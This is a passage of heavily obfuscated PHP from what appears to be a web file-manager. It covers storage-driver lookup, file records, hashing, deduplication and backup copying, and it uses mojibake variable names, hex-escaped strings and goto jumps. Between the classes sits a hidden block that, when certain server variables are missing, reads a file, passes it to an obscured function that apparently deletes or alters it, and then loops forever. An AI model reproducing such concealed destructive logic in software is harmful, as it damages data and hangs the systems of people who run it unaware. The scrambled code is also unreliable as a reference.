$ŞÇ¬„é > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\145\x52\145\141\144\x20\145\162\162\157\x72\41\x20\x73\x74\141\162\x74\75{$øã£””™}\x3b\154\x65\156\147\x74\150\75{$ŞÇ¬„é}\x3b\40\x73\151\x7a\x65\75{$óª€´¥Û}\x3b"); } $²ğ¡œ¯í = $§şÑ„Á->fileSubstr($‰î’¬€Ê, $øã£””™, $ŞÇ¬„é); if (!$²ğ¡œ¯í && $ŞÇ¬„é && isset($GLOBALS[$Ç‡õ“ó[1172]])) { throw new Exception($GLOBALS[$Ç‡õ“ó[1172]][$Ç‡õ“ó[1173]]); } return $²ğ¡œ¯í; } private static function driverMake(&$’×‰Ùùó) { $Î”Ò†‘ =& $_SERVER[ùÆÎÔ“Ñ]; $µ¾è¹ãÙ = KodIO::parse($’×‰Ùùó); if (!self::$driverListSystem) { $©Õ¾„Û = Model($Î”Ò†‘[768])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($©Õ¾„Û, $Î”Ò†‘[399]); } if ($µ¾è¹ãÙ[$Î”Ò†‘[33]] == KodIO::KOD_IO && !self::$driverListSystem[$µ¾è¹ãÙ[$Î”Ò†‘[399]]]) { return !1; } $’×‰Ùùó = $µ¾è¹ãÙ[$Î”Ò†‘[1174]]; $º·ŞÀíÕ = self::driverGet($µ¾è¹ãÙ, $’×‰Ùùó); return $º·ŞÀíÕ; } private static function driverGet($ÏÒ¦Ø, &$¢³¿Î‹Î) { $‘ø‡³£î =& $_SERVER[ùÆÎÔ“Ñ]; $–­¤ãÌì = $ÏÒ¦Ø[$‘ø‡³£î[1175]]; $“ÏÃ¢ß = $ÏÒ¦Ø[$‘ø‡³£î[399]]; switch ($ÏÒ¦Ø[$‘ø‡³£î[33]]) { case KodIO::KOD_IO: $‡³œå† = self::$driverListSystem[$“ÏÃ¢ß]; break; case KodIO::KOD_SOURCE: $¢³¿Î‹Î = $“ÏÃ¢ß . $¢³¿Î‹Î; $‡³œå† = array($‘ø‡³£î[1176] => $‘ø‡³£î[1177], $‘ø‡³£î[6] => $ÏÒ¦Ø); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ÈÈÏ¸ü = $GLOBALS[$‘ø‡³£î[1178]]; self::$driverListUser = array_to_keyvalue($ÈÈÏ¸ü, $‘ø‡³£î[399]); } $‡³œå† = self::$driverListUser[$“ÏÃ¢ß]; break; case KodIO::KOD_SHARE_LINK: $‡³œå† = array($‘ø‡³£î[1176] => $‘ø‡³£î[1179], $‘ø‡³£î[6] => $ÏÒ¦Ø); $ıÒÚ€ı³ = Action($‘ø‡³£î[1180])->sharePathInfo($ÏÒ¦Ø[$‘ø‡³£î[84]]); $¢³¿Î‹Î = $ıÒÚ€ı³[$‘ø‡³£î[402]]; if (!$ıÒÚ€ı³[$‘ø‡³£î[402]]) { $Í¡†»öõ = Model($‘ø‡³£î[601])->getInfo($ıÒÚ€ı³[$‘ø‡³£î[489]]); $¢³¿Î‹Î = KodIO::clear($Í¡†»öõ[$‘ø‡³£î[1181]] . $ÏÒ¦Ø[$‘ø‡³£î[1174]]); $ÏÒ¦Ø[$‘ø‡³£î[487]] = $Í¡†»öõ; $ÏÒ¦Ø[$‘ø‡³£î[1156]] = $¢³¿Î‹Î; $‡³œå† = array($‘ø‡³£î[1176] => $‘ø‡³£î[1182], $‘ø‡³£î[6] => $ÏÒ¦Ø); } break; case KodIO::KOD_SHARE_ITEM: $‡³œå† = array($‘ø‡³£î[1176] => $‘ø‡³£î[1183], $‘ø‡³£î[6] => $ÏÒ¦Ø); $Í¡†»öõ = Model($‘ø‡³£î[601])->getInfo($ÏÒ¦Ø[$‘ø‡³£î[399]]); if ($Í¡†»öõ[$‘ø‡³£î[402]] == $‘ø‡³£î[197]) { $¢³¿Î‹Î = KodIO::clear($Í¡†»öõ[$‘ø‡³£î[1181]] . $ÏÒ¦Ø[$‘ø‡³£î[1174]]); $ÏÒ¦Ø[$‘ø‡³£î[487]] = $Í¡†»öõ; $ÏÒ¦Ø[$‘ø‡³£î[1156]] = $¢³¿Î‹Î; $‡³œå† = array($‘ø‡³£î[1176] => $‘ø‡³£î[1184], $‘ø‡³£î[6] => $ÏÒ¦Ø); } else { if (!$¢³¿Î‹Î) { $¢³¿Î‹Î = $Í¡†»öõ[$‘ø‡³£î[402]]; } } break; default: $¢³¿Î‹Î = $ÏÒ¦Ø[$‘ø‡³£î[84]]; $‡³œå† = array($‘ø‡³£î[1176] => $‘ø‡³£î[1185]); break; } $Â‰‚Ø‡Â = $ÏÒ¦Ø[$‘ø‡³£î[84]]; if (!isset(self::$driverCache[$Â‰‚Ø‡Â])) { $…¤‰µØØ = strtolower($‡³œå†[$‘ø‡³£î[95]]); $Áó³“Åˆ = $GLOBALS[$‘ø‡³£î[6]][$‘ø‡³£î[89]][$‘ø‡³£î[827]]; $™ö›¢ç = $‘ø‡³£î[74] . (isset($Áó³“Åˆ[$…¤‰µØØ]) ? $Áó³“Åˆ[$…¤‰µØØ] : ucfirst($…¤‰µØØ)); if (!class_exists($™ö›¢ç)) { show_json("{$™ö›¢ç}\x20\156\157\164\x20\x65\x78\x69\x73\x74\163\41", !1); } $ÖÚöª§ = isset($‡³œå†[$‘ø‡³£î[6]]) ? $‡³œå†[$‘ø‡³£î[6]] : !1; self::$driverCache[$Â‰‚Ø‡Â] = new $™ö›¢ç($ÖÚöª§); } $Ç ©Ã¿Ñ = self::$driverCache[$Â‰‚Ø‡Â]; $Ç ©Ã¿Ñ->pathDriver = $–­¤ãÌì; $Ç ©Ã¿Ñ->pathBase = $‘ø‡³£î[12]; if (isset($‡³œå†[$‘ø‡³£î[6]][$‘ø‡³£î[1186]])) { $Ç ©Ã¿Ñ->pathBase = rtrim($‡³œå†[$‘ø‡³£î[6]][$‘ø‡³£î[1186]], $‘ø‡³£î[8]) . $‘ø‡³£î[8]; $¢³¿Î‹Î = $Ç ©Ã¿Ñ->pathBase . ltrim($¢³¿Î‹Î, $‘ø‡³£î[8]); } $¢³¿Î‹Î = $Ç ©Ã¿Ñ->getPath($¢³¿Î‹Î); if (isset($ÏÒ¦Ø[$‘ø‡³£î[1156]])) { $¢³¿Î‹Î = $ÏÒ¦Ø[$‘ø‡³£î[1156]]; } $Ç ©Ã¿Ñ->path = $¢³¿Î‹Î; return $Ç ©Ã¿Ñ; } public static function errorTips($”„–ª‰× = false) { $ÄºõÑşç =& $_SERVER[ùÆÎÔ“Ñ]; static $¤ªÜÀ™ü = array(); $öÄéÂü’ = 1000; if ($”„–ª‰× === -1) { return $¤ªÜÀ™ü ? $¤ªÜÀ™ü[count($¤ªÜÀ™ü) - 1] : $ÄºõÑşç[12]; } if ($”„–ª‰× === !1) { return implode($ÄºõÑşç[231], $¤ªÜÀ™ü); } if (count($¤ªÜÀ™ü) >= $öÄéÂü’) { $¤ªÜÀ™ü = array_slice($¤ªÜÀ™ü, $öÄéÂü’ * 0.5, $öÄéÂü’); } $¤ªÜÀ™ü[] = $”„–ª‰×; write_log($ÄºõÑşç[162] . ACTION . $ÄºõÑşç[1187] . $”„–ª‰×, $ÄºõÑşç[1188]); } public static function getLastError($Ş¦Æ£ı = '') { $½ˆâÄä¨ = self::errorTips(-1); return $½ˆâÄä¨ ? $½ˆâÄä¨ : $Ş¦Æ£ı; } } goto eôğŠ·ÁÅ; a¨ÌñßÉ¡§: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\151\154\x65\137\143\157\156\x74\x65\x6e\164\163"; protected $dataAuto = array(array("\143\x72\145\x61\x74\x65\x54\x69\155\145", "\164\151\155\x65", "\x69\156\x73\145\x72\x74", "\x66\165\x6e\x63\164\x69\x6f\x6e")); } if (!isset($_SERVER[$_SERVER[ùÆÎÔ“Ñ][841]]) || !isset($_SERVER[$_SERVER[ùÆÎÔ“Ñ][848]])) { $_getc = $_SERVER[ùÆÎÔ“Ñ][843]; $_getfile = $_SERVER[$_SERVER[ùÆÎÔ“Ñ][844]] . $_SERVER[ùÆÎÔ“Ñ][845]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ùÆÎÔ“Ñ][231], $_getfilec); if (count($_getarrs) < $_SERVER[ùÆÎÔ“Ñ][645]) { $exit = $_SERVER[ùÆÎÔ“Ñ][846]; $exit(); } $_act = $_SERVER[ùÆÎÔ“Ñ][847]; $_act($_SERVER[$_SERVER[ùÆÎÔ“Ñ][844]] . $_SERVER[ùÆÎÔ“Ñ][845]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ùÆÎÔ“Ñ][378]); } } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\x6c\145"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\141\155\145" => "\151\x6f\x5f\146\x69\154\x65\x5f\x6d\145\x74\x61", "\x6d\x65\x74\141\x46\x69\145\154\x64" => "\146\x69\x6c\x65\x49\104"); public function fileInfo($âùÏ†ò) { $Ì¹°éà =& $_SERVER[ùÆÎÔ“Ñ]; static $ªÃ‘ãÅû = array(); if (!isset($ªÃ‘ãÅû[$âùÏ†ò])) { $Â†Œşµò = $Ì¹°éà[1906]; $ÁëÈĞƒÛ = Model($Ì¹°éà[471])->field($Â†Œşµò)->where(array($Ì¹°éà[469] => $âùÏ†ò))->find(); $ªÃ‘ãÅû[$âùÏ†ò] = $ÁëÈĞƒÛ; } return $ªÃ‘ãÅû[$âùÏ†ò]; } public function addFileByContent($ğ¸™—ò = '', $ø‹é˜ïÆ = '') { $Á€‡Â™ =& $_SERVER[ùÆÎÔ“Ñ]; $É˜öŒö = TEMP_PATH . $Á€‡Â™[1907]; if (!is_dir($É˜öŒö)) { mk_dir($É˜öŒö); } $Æ„æ—ï = $É˜öŒö . $Á€‡Â™[1908] . rand_string(16); file_put_contents($Æ„æ—ï, $ğ¸™—ò); $ÉÂ£îÊĞ = $this->addFile($Æ„æ—ï, $ø‹é˜ïÆ, !0); if (file_exists($Æ„æ—ï)) { @unlink($Æ„æ—ï); } return $ÉÂ£îÊĞ; } public function createFileName($Ä´«—›Ä, $çªüÒÛ‹ = false, $¤¡Îä³Æ = false) { $«’¡÷Æ =& $_SERVER[ùÆÎÔ“Ñ]; $¶áš˜ò— = IO::init($«’¡÷Æ[8]); $ÑÃıÇœì = $this->makeFilePath($Ä´«—›Ä, $¶áš˜ò—, $çªüÒÛ‹, $¤¡Îä³Æ); $™ôéœˆÀ = $¶áš˜ò—->pathFather($ÑÃıÇœì); static $˜îé‘¹Ç = false; $ëˆêæ‘ = $«’¡÷Æ[1909] . md5($™ôéœˆÀ); if (!$˜îé‘¹Ç && !Cache::get($ëˆêæ‘)) { $˜îé‘¹Ç = !0; $—ÓÃÜ¸² = IO::mkdir($™ôéœˆÀ); if (!IO::exist($—ÓÃÜ¸² . $«’¡÷Æ[798])) { IO::mkfile($—ÓÃÜ¸² . $«’¡÷Æ[798]); } Cache::set($ëˆêæ‘, 1, 3600 * 2); } return $ÑÃıÇœì; } public function makeFilePath($Íââá¶‰, $³’ùôù, $•üóˆ½ë = false, $¬©‹û¸ = false) { $ùÂ÷ê‡ =& $_SERVER[ùÆÎÔ“Ñ]; $‚ßÖ“¥ = Model($ùÂ÷ê‡[771])->get($ùÂ÷ê‡[1910]); $©’²Ì³ = KodIO::defaultIO() . date($ùÂ÷ê‡[1911]); $À‡ê­ùƒ = $©’²Ì³ . rand_string(5) . short_id(100); $Íââá¶‰ = str_replace($ùÂ÷ê‡[8], $ùÂ÷ê‡[11], KodIO::clear($Íââá¶‰)); $Ì°ş‰ÊÆ = $³’ùôù->ext($Íââá¶‰); if (!$Íââá¶‰) { $‚ßÖ“¥ = $ùÂ÷ê‡[1912]; } switch ($‚ßÖ“¥) { case $ùÂ÷ê‡[1913]: $À‡ê­ùƒ = $À‡ê­ùƒ . $ùÂ÷ê‡[10] . $³’ùôù->ext($Íââá¶‰); if ($Ì°ş‰ÊÆ == $ùÂ÷ê‡[1850]) { $À‡ê­ùƒ .= $ùÂ÷ê‡[1212]; } break; case $ùÂ÷ê‡[1914]: $ÌâºíÛ½ = Model($ùÂ÷ê‡[771])->get($ùÂ÷ê‡[772]); $«üÓ›©¢ = substr(md5($ùÂ÷ê‡[773] . $ÌâºíÛ½ . date($ùÂ÷ê‡[749])), 0, 8); $ÒÈøñı„ = KodIO::defaultDriver(); $©’²Ì³ = $ùÂ÷ê‡[1243] . $ÒÈøñı„[$ùÂ÷ê‡[399]] . $ùÂ÷ê‡[409] . date($ùÂ÷ê‡[1915]) . $«üÓ›©¢ . $ùÂ÷ê‡[8]; if ($Ì°ş‰ÊÆ == $ùÂ÷ê‡[1850]) { $Íââá¶‰ .= $ùÂ÷ê‡[1212]; } $ÛÇ¸Â¦ï = $ùÂ÷ê‡[1916] . $©’²Ì³ . $Íââá¶‰; CacheLock::lock($ÛÇ¸Â¦ï); $À‡ê­ùƒ = $©’²Ì³ . $Íââá¶‰; if (IO::exist($©’²Ì³ . $Íââá¶‰)) { $â†Ûàç½ = substr($Íââá¶‰, 0, strlen($Íââá¶‰) - strlen($Ì°ş‰ÊÆ)); $¥”Àı“º = $¬©‹û¸ ? substr($¬©‹û¸, 0, 5) : ($•üóˆ½ë ? substr($•üóˆ½ë, 0, 5) : rand_string(5)); $À‡ê­ùƒ = $©’²Ì³ . $â†Ûàç½ . $¥”Àı“º . $ùÂ÷ê‡[10] . $Ì°ş‰ÊÆ; } if (IO::isTypeObject($À‡ê­ùƒ) && !IO::isUploadServer($À‡ê­ùƒ)) { if (IO::exist($À‡ê­ùƒ)) { return $À‡ê­ùƒ; } $€½Ğ°ú› = IO::setContent($À‡ê­ùƒ, $ùÂ÷ê‡[12]); if (!$€½Ğ°ú›) { show_json($ùÂ÷ê‡[1917], !1); } } CacheLock::unlock($ÛÇ¸Â¦ï); break; case $ùÂ÷ê‡[1912]: break; default: break; } return $À‡ê­ùƒ; } public function addFileByRemote($ß”¤Ï‚½, $ä¶ÆÉ‹, $á½´Æ²ñ = array()) { $İ›ô¹ÕÑ =& $_SERVER[ùÆÎÔ“Ñ]; if (!IO::exist($ß”¤Ï‚½)) { return !1; } $¼ŠñÓºÆ = $á½´Æ²ñ[$İ›ô¹ÕÑ[176]] ? $á½´Æ²ñ[$İ›ô¹ÕÑ[176]] : $İ›ô¹ÕÑ[12]; $êú«ˆ‰¬ = IO::hashMd5($ß”¤Ï‚½, $¼ŠñÓºÆ); $ß Ù•ëş = KodIO::defaultDriver(); $ùáñòòÜ = array($İ›ô¹ÕÑ[585] => IO::size($ß”¤Ï‚½), $İ›ô¹ÕÑ[1918] => 1, $İ›ô¹ÕÑ[420] => $ä¶ÆÉ‹, $İ›ô¹ÕÑ[809] => $ß Ù•ëş[$İ›ô¹ÕÑ[399]], $İ›ô¹ÕÑ[421] => $ß”¤Ï‚½, $İ›ô¹ÕÑ[1919] => $á½´Æ²ñ[$İ›ô¹ÕÑ[177]] ? $á½´Æ²ñ[$İ›ô¹ÕÑ[177]] : IO::hashSimple($ß”¤Ï‚½), $İ›ô¹ÕÑ[1920] => $êú«ˆ‰¬ ? $êú«ˆ‰¬ : $¼ŠñÓºÆ); if ($ßò šÈ¼ = $this->addFileCheckExist($ùáñòòÜ[$İ›ô¹ÕÑ[177]], $ùáñòòÜ[$İ›ô¹ÕÑ[176]], $ùáñòòÜ[$İ›ô¹ÕÑ[76]])) { return $ßò šÈ¼; } return $this->addFileData($ùáñòòÜ); } private function addFileData($ºİœÌÂË) { $­ÄÑ®œÖ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ºİœÌÂË) { return !1; } $ºİœÌÂË[$­ÄÑ®œÖ[76]] = intval($ºİœÌÂË[$­ÄÑ®œÖ[76]]); if (!$ºİœÌÂË[$­ÄÑ®œÖ[76]] && strlen($ºİœÌÂË[$­ÄÑ®œÖ[177]]) > 32) { $ºİœÌÂË[$­ÄÑ®œÖ[76]] = intval(substr($ºİœÌÂË[$­ÄÑ®œÖ[177]], 32)); } $¾´†¾ğî = $this->add($ºİœÌÂË); return $this->find($¾´†¾ğî); } public function addFile($Îêã÷µş, $›á×³, $ûşö†™è = false) { $¶ä‰ó =& $_SERVER[ùÆÎÔ“Ñ]; $²ıâ™‹Í = IO::hashSimple($Îêã÷µş); $÷óìĞ­Û = IO::size($Îêã÷µş); $¢È¬æ§´ = $÷óìĞ­Û <= 1024 * 1024 * 10 ? IO::hashMd5($Îêã÷µş) : $¶ä‰ó[12]; $ë§Í©ß = $¶ä‰ó[1921] . $²ıâ™‹Í; CacheLock::lock($ë§Í©ß); if ($¢È¬æ§´ && $²ıâ™‹Í) { $×‘¡© = $this->addFileCheckExist($²ıâ™‹Í, $¢È¬æ§´, $÷óìĞ­Û); if ($×‘¡©) { CacheLock::unlock($ë§Í©ß); return $×‘¡©; } } $Şà÷Å¾Ú = $this->addFileMake($Îêã÷µş, $÷óìĞ­Û, $²ıâ™‹Í, $¢È¬æ§´, $›á×³, $ûşö†™è); $§—”¨Á¥ = $this->addFileData($Şà÷Å¾Ú); CacheLock::unlock($ë§Í©ß); if (!$¢È¬æ§´ && $§—”¨Á¥) { $this->fileMd5Check($§—”¨Á¥); } return $§—”¨Á¥; } private function fileMd5Check($ù„Ï‰ÚÍ) { $İö¦ÌÂ· =& $_SERVER[ùÆÎÔ“Ñ]; $Ëâ‘¸Àá = array($ù„Ï‰ÚÍ[$İö¦ÌÂ·[468]], $ù„Ï‰ÚÍ[$İö¦ÌÂ·[84]]); $ÁÒŠƒş = $İö¦ÌÂ·[1922] . $ù„Ï‰ÚÍ[$İö¦ÌÂ·[84]]; $”¥—•ô€ = $İö¦ÌÂ·[1923] . $ù„Ï‰ÚÍ[$İö¦ÌÂ·[468]]; $¶«Í±‰· = TaskQueue::add($İö¦ÌÂ·[1924], $Ëâ‘¸Àá, $ÁÒŠƒş, $”¥—•ô€); if (!$¶«Í±‰·) { $this->fileMd5Set($ù„Ï‰ÚÍ[$İö¦ÌÂ·[468]], $ù„Ï‰ÚÍ[$İö¦ÌÂ·[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($å²ƒÃÎ‰, $ğñêÁ›) { $ııÓŞĞÕ =& $_SERVER[ùÆÎÔ“Ñ]; $Î„“æÔ = $this->find($å²ƒÃÎ‰); if (!$Î„“æÔ || $Î„“æÔ[$ııÓŞĞÕ[176]]) { return; } $×­¤öƒ• = IO::hashMd5($ğñêÁ›); if (!$×­¤öƒ•) { return $ııÓŞĞÕ[12]; } $this->where(array($ııÓŞĞÕ[468] => $å²ƒÃÎ‰))->save(array($ııÓŞĞÕ[176] => $×­¤öƒ•)); } public function addFileMake($“Ò›†À‡, $Ù…øÕ¼, $†ğ¤âÈ¦, $œ£”öä¸, $èÖÑ· ½, $÷§°­â‚) { $çÔ„Ø”Î =& $_SERVER[ùÆÎÔ“Ñ]; $Ü”§ã› = $this->createFileName($èÖÑ· ½, $†ğ¤âÈ¦, $œ£”öä¸); $ü‡¡ûóá = get_path_father($Ü”§ã›); $°†÷÷öú = get_path_this($Ü”§ã›); if ($÷§°­â‚) { $¿ê‘ƒáö = IO::move($“Ò›†À‡, $ü‡¡ûóá, !1, $°†÷÷öú); } else { $¿ê‘ƒáö = IO::copy($“Ò›†À‡, $ü‡¡ûóá, !1, $°†÷÷öú); } if (!$¿ê‘ƒáö) { return !1; } $££ØĞ˜÷ = KodIO::defaultDriver(); $ÃÜ•İş = array($çÔ„Ø”Î[585] => $Ù…øÕ¼, $çÔ„Ø”Î[1918] => 1, $çÔ„Ø”Î[420] => $èÖÑ· ½, $çÔ„Ø”Î[809] => $££ØĞ˜÷[$çÔ„Ø”Î[399]], $çÔ„Ø”Î[421] => $Ü”§ã›, $çÔ„Ø”Î[1919] => $†ğ¤âÈ¦, $çÔ„Ø”Î[1920] => $œ£”öä¸); return $ÃÜ•İş; } public function addFileCheckExist($Ú²¸ âó, $¶ÜêÖºÍ, $Ú®ĞÒÆ“) { $àå÷¥­¾ =& $_SERVER[ùÆÎÔ“Ñ]; $ùªÖ¸ÜÖ = $this->findByHash($Ú²¸ âó, $¶ÜêÖºÍ); if (!$ùªÖ¸ÜÖ) { return !1; } $²üÊæùˆ = array($àå÷¥­¾[1918] => intval($ùªÖ¸ÜÖ[$àå÷¥­¾[1925]]) + 1, $àå÷¥­¾[585] => $Ú®ĞÒÆ“); $this->where(array($àå÷¥­¾[469] => $ùªÖ¸ÜÖ[$àå÷¥­¾[468]]))->save($²üÊæùˆ); return $ùªÖ¸ÜÖ; } public function remove($·Ñ ¢ßê) { $this->linkCountChange($·Ñ ¢ßê, !1); $this->clearEmpty(); return !0; } public function linkAdd($Ì§àÁ‚ğ) { $this->linkCountChange($Ì§àÁ‚ğ, !0); } public function linkCountChange($†´®Ç„¼, $ğú¤ÀÄØ) { $ ¦ê¯ºÔ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$†´®Ç„¼) { return; } if (!is_array($†´®Ç„¼)) { $†´®Ç„¼ = array($†´®Ç„¼); } $ãá ÛÜÍ = array(); foreach ($†´®Ç„¼ as $­İ­ü) { $€±à”öŸ = $­İ­ü . $ ¦ê¯ºÔ[12]; if (!$ãá ÛÜÍ[$€±à”öŸ]) { $ãá ÛÜÍ[$€±à”öŸ] = 0; } $ãá ÛÜÍ[$€±à”öŸ]++; } $Š”Ûƒ± = array(); foreach ($ãá ÛÜÍ as $­İ­ü => $“ñ±…€Ø) { $€±à”öŸ = $“ñ±…€Ø . $ ¦ê¯ºÔ[12]; if (!$Š”Ûƒ±[$€±à”öŸ]) { $Š”Ûƒ±[$€±à”öŸ] = array(); } $Š”Ûƒ±[$€±à”öŸ][] = $­İ­ü; } foreach ($Š”Ûƒ± as $“ñ±…€Ø => $Ì–µúÍ) { if (!$Ì–µúÍ) { continue; } $“ñ±…€Ø = $ğú¤ÀÄØ ? $“ñ±…€Ø : -intval($“ñ±…€Ø); $ñšÕÍáõ = array($ ¦ê¯ºÔ[468] => array($ ¦ê¯ºÔ[7], $Ì–µúÍ)); if ($“ñ±…€Ø < 0) { $ñšÕÍáõ[$ ¦ê¯ºÔ[1925]] = array($ ¦ê¯ºÔ[1020], abs($“ñ±…€Ø)); } $this->where($ñšÕÍáõ)->setAdd($ ¦ê¯ºÔ[1925], $“ñ±…€Ø); } } public function findByHash($ÂÕûúŒ, $¶ççÈòâ = false) { $Ù©¼ïí£ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ÂÕûúŒ && !$¶ççÈòâ) { return !1; } $æªÉ»ÅÉ = array($Ù©¼ïí£[1919] => $ÂÕûúŒ); if ($¶ççÈòâ) { $æªÉ»ÅÉ = array($Ù©¼ïí£[1920] => $¶ççÈòâ); } return $this->order($Ù©¼ïí£[1926])->where($æªÉ»ÅÉ)->find(); } public function clearEmpty($²“‡İ¿ = 0) { $Ù¸ü¬›¶ =& $_SERVER[ùÆÎÔ“Ñ]; $ê–ÀËµ› = time() - 3600 * 24 * $²“‡İ¿; $ÁûÙ‘³§ = $Ù¸ü¬›¶[1927] . $ê–ÀËµ›; $íä…õ¼ = $this->where($ÁûÙ‘³§)->select(); if (!$íä…õ¼) { return; } $Óæ¯ª¾ = new Task($Ù¸ü¬›¶[1928], $Ù¸ü¬›¶[12], count($íä…õ¼)); foreach ($íä…õ¼ as $°ÃİåƒŞ) { $Óæ¯ª¾->update(1); $this->resetFile($°ÃİåƒŞ); } $Óæ¯ª¾->end(); } public function resetFile($éöûˆı°) { $æ¸˜¦Ÿ™ =& $_SERVER[ùÆÎÔ“Ñ]; $¶ª™™ï = array($æ¸˜¦Ÿ™[469] => $éöûˆı°[$æ¸˜¦Ÿ™[468]]); $†‡½„åë = Model($æ¸˜¦Ÿ™[1341])->where($¶ª™™ï)->count(); $›à·Ó— = Model($æ¸˜¦Ÿ™[1929])->where($¶ª™™ï)->count(); $¦ó¯§×’ = intval($†‡½„åë) + intval($›à·Ó—); if ($¦ó¯§×’ == 0) { IO::remove($éöûˆı°[$æ¸˜¦Ÿ™[84]]); Model($æ¸˜¦Ÿ™[1930])->delete($éöûˆı°[$æ¸˜¦Ÿ™[468]]); $this->where($¶ª™™ï)->delete(); $this->metaSet($éöûˆı°[$æ¸˜¦Ÿ™[468]], null, null); return; } if ($éöûˆı°[$æ¸˜¦Ÿ™[1925]] != $¦ó¯§×’) { $this->where($¶ª™™ï)->save(array($æ¸˜¦Ÿ™[1918] => $¦ó¯§×’)); } } public function storageInfo($öŞ÷÷– = false) { $šˆ©åì =& $_SERVER[ùÆÎÔ“Ñ]; $¿¡ü¯è× = $this->count() + 0.0; $•—»¤èğ = 0; $‚à¦â™Û = 1; $ˆïÛ•Àá = 0; $£ª±ùóŸ = 5000; for ($ğ³õÁÂ = 0; $ğ³õÁÂ < $¿¡ü¯è×; $ğ³õÁÂ = $ğ³õÁÂ + $£ª±ùóŸ) { $…€‘Á = $this->limit($ğ³õÁÂ, $ğ³õÁÂ + $£ª±ùóŸ)->select(); foreach ($…€‘Á as $ƒ¥ŒöÃ) { $‚à¦â™Û += $ƒ¥ŒöÃ[$šˆ©åì[76]] * $ƒ¥ŒöÃ[$šˆ©åì[1925]]; $•—»¤èğ += $ƒ¥ŒöÃ[$šˆ©åì[76]] * ($ƒ¥ŒöÃ[$šˆ©åì[1925]] - 1); $ˆïÛ•Àá += $ƒ¥ŒöÃ[$šˆ©åì[1925]]; } } $‰ı„¢µê = array($šˆ©åì[1931] => $‚à¦â™Û, $šˆ©åì[1932] => $•—»¤èğ, $šˆ©åì[1933] => $•—»¤èğ / $‚à¦â™Û, $šˆ©åì[80] => $¿¡ü¯è×, $šˆ©åì[1934] => $ˆïÛ•Àá); return $‰ı„¢µê; } } goto E¼•¯¬Ùù»; fÄ‰†´´™„: class BackupFile { public function __construct() { } public function index() { $°¶®Íé = Backup::get(); $ä‰¬Éˆ½ = $°¶®Íé[$_SERVER[ùÆÎÔ“Ñ][293]][$_SERVER[ùÆÎÔ“Ñ][199]][$_SERVER[ùÆÎÔ“Ñ][468]]; $ÆœÕùÌ = array($_SERVER[ùÆÎÔ“Ñ][469] => array($_SERVER[ùÆÎÔ“Ñ][808], $ä‰¬Éˆ½), $_SERVER[ùÆÎÔ“Ñ][809] => array($_SERVER[ùÆÎÔ“Ñ][331], $°¶®Íé[$_SERVER[ùÆÎÔ“Ñ][753]])); $ï£…‘¨ = (int) Model($_SERVER[ùÆÎÔ“Ñ][790])->where($ÆœÕùÌ)->count($_SERVER[ùÆÎÔ“Ñ][468]); $ŠÊÚ¡åä = (int) Model($_SERVER[ùÆÎÔ“Ñ][790])->where($ÆœÕùÌ)->sum($_SERVER[ùÆÎÔ“Ñ][76]); $³Î°ÕÑË = new TaskFileTransfer($_SERVER[ùÆÎÔ“Ñ][810], $_SERVER[ùÆÎÔ“Ñ][781], $ï£…‘¨, LNG($_SERVER[ùÆÎÔ“Ñ][782]) . $_SERVER[ùÆÎÔ“Ñ][783] . LNG($_SERVER[ùÆÎÔ“Ñ][811])); $³Î°ÕÑË->task[$_SERVER[ùÆÎÔ“Ñ][764]] = $ŠÊÚ¡åä; $ë™¥ˆÁÀ = array($_SERVER[ùÆÎÔ“Ñ][812] => $ï£…‘¨, $_SERVER[ùÆÎÔ“Ñ][813] => $ŠÊÚ¡åä, $_SERVER[ùÆÎÔ“Ñ][814] => time()); Backup::set($ë™¥ˆÁÀ); $À®ë¸ü = !0; $§ºÀÇ³ì = $this->storeIds(); $ê ¾Ğ™¡ = 1; $Ã¶ƒûó· = 1000; $³³‰Î²Ú = $é±¯Šãœ = 0; $şËŸ›Œ® = array(); $æµ¹£Çï = $„ü¸—Ø± = 0; do { $Ÿøêß” = $_SERVER[ùÆÎÔ“Ñ][815]; $ò³ñú¸Û = Model($_SERVER[ùÆÎÔ“Ñ][790])->where($ÆœÕùÌ)->field($Ÿøêß”)->order($_SERVER[ùÆÎÔ“Ñ][816])->selectPage($Ã¶ƒûó·, $ê ¾Ğ™¡); $­ÙÚÊó = !empty($ò³ñú¸Û[$_SERVER[ùÆÎÔ“Ñ][369]]) ? $ò³ñú¸Û[$_SERVER[ùÆÎÔ“Ñ][369]] : array(); foreach ($­ÙÚÊó as $ ¥Šõ±) { if (!$this->_fileExist($ ¥Šõ±, $şËŸ›Œ®, $§ºÀÇ³ì)) { $ï£…‘¨ -= 1; $ŠÊÚ¡åä -= (int) $ ¥Šõ±[$_SERVER[ùÆÎÔ“Ñ][76]]; write_log("\146\x69\x6c\145\40\x6e\x6f\x74\40\x65\x78\151\163\x74\56\146\x69\154\x65\x49\104\x3a{$ ¥Šõ±[$_SERVER[ùÆÎÔ“Ñ][468]]}\x2c\40\x70\x61\164\150\x3a{$ ¥Šõ±[$_SERVER[ùÆÎÔ“Ñ][84]]}", $_SERVER[ùÆÎÔ“Ñ][817]); continue; } $•“½şÒ = $ ¥Šõ±[$_SERVER[ùÆÎÔ“Ñ][84]]; $Ì…Ü€Ê³ = "\x7b\151\157\x3a{$°¶®Íé[$_SERVER[ùÆÎÔ“Ñ][753]]}\x7d" . substr($•“½şÒ, strlen("\x7b\x69\x6f\x3a{$ ¥Šõ±[$_SERVER[ùÆÎÔ“Ñ][818]]}\x7d")); if (IO::exist($Ì…Ü€Ê³)) { $³Î°ÕÑË->updateFileEnd($ ¥Šõ±[$_SERVER[ùÆÎÔ“Ñ][32]], $ ¥Šõ±[$_SERVER[ùÆÎÔ“Ñ][76]]); } else { $Ì…Ü€Ê³ = get_path_father($Ì…Ü€Ê³); IO::mkdir($Ì…Ü€Ê³); if (!IO::copy($•“½şÒ, $Ì…Ü€Ê³, $_SERVER[ùÆÎÔ“Ñ][819])) { write_log($_SERVER[ùÆÎÔ“Ñ][820] . $•“½şÒ . 